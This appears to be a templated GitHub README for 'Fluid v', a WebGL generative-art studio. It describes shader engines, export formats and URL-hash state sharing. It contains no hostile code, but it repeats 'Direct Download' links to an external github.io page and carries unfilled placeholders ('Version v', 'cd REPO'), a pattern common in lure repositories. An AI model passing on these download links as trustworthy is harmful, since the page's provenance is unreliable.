# Fluid v - WebGL generative art studio 2026

> Fluid is a dependency-free HTML WebGL studio for building generative backgrounds and live embeds, with export and sharing tools for reusable visual output.

[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evan-reed1999/fluid-v-live-embed?style=flat-square)](https://github.com/evan-reed1999/fluid-v-live-embed)

---

<p align="center">
  <a href="https://evan-reed1999.github.io/fluid-v-live-embed/">
    <img src="https://img.shields.io/badge/Download-Fluid%20Latest-brightgreen?style=for-the-badge" alt="Download Fluid">
  </a>
</p>

> **[Direct Download - Fluid v](https://evan-reed1999.github.io/fluid-v-live-embed/)**

---

[Download Latest Build](https://evan-reed1999.github.io/fluid-v-live-embed/)

---

## Overview

Fluid is a compact WebGL playground for rapid visual experimentation. It helps you create abstract motion, ambient backgrounds, and embed-ready scenes from one HTML-based studio, without pulling in external dependencies for the core workflow.

The project is aimed at designers, developers, and visual creators who need reusable artwork for landing pages, presentations, headers, or showcases. Its workflow centers on generation, refinement, export, and sharing, so a concept can quickly become something ready to publish.

---

## Capabilities

- Fragment-shader renderer with multiple field engines
- Kaleidoscope symmetry and layered blends for richer compositions
- Preset palettes plus custom gradient control
- Image melt behavior driven by uploaded image luminance
- Text fill tools with font selection and local persistence
- Export output as PNG, JPG, WebP, or self-contained HTML
- Clip recording support through MediaRecorder
- URL hash share links with round-trip state restoration

---

## Getting Started

You can clone the project or download the files, then open the HTML entry point in a browser:

1. Download the project files or clone the repo
2. Open the main HTML file directly, or serve it from a static host
3. Start adjusting presets, text, images, or export options in the studio

Example:

    git clone https://github.com/evan-reed1999/fluid-v-live-embed.git
    cd REPO

If you prefer to run it locally, any static file server will work as long as you load the app in a modern browser.

---

## How to Use It

A common workflow is:

1. Pick a field engine or scene preset
2. Tune palette, gradients, symmetry, and blend behavior
3. Add text or an image when you want a layered composition
4. Share the current state through the generated URL hash
5. Export the result as an image, HTML bundle, or clip

For embeddable visuals, the single-file output is especially handy when you want to move a finished scene into another site or hosting setup.

---

## State and Configuration

Fluid keeps interactive state in the URL hash so it can be shared and restored, and it also stores some local preferences such as text-related choices in browser storage.

A simple example of the kind of state it can preserve:

    {
      "preset": "custom",
      "palette": "aurora",
      "text": "Fluid",
      "font": "sans-serif",
      "symmetry": 6
    }

If you are using exports or embeds, the generated HTML output contains the scene state needed for reuse.

---

## Requirements

- A modern browser with WebGL support
- HTML hosting or local file access for the main app
- Browser APIs for export and recording features
- Enough storage for saved preferences and exported media
- A static host if you want to deploy live embeds or shareable pages

---

## FAQ

**How do I update Fluid?**  
Replace your local files with the latest version from the repository or download location, then reopen the app.

**Where are settings saved?**  
Scene state is shared through the URL hash, while some preferences are kept locally in the browser.

**Why does export or recording not work?**  
Check that your browser supports the required APIs, including WebGL and MediaRecorder, and that the page is being served in a compatible environment.

**Can I use it for embeds?**  
Yes, the project is designed around live embeds and self-contained output, which makes it practical for publishing generated visuals.

**Does it require extra packages?**  
The core studio is dependency-free, so it is intended to run without additional runtime packages.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
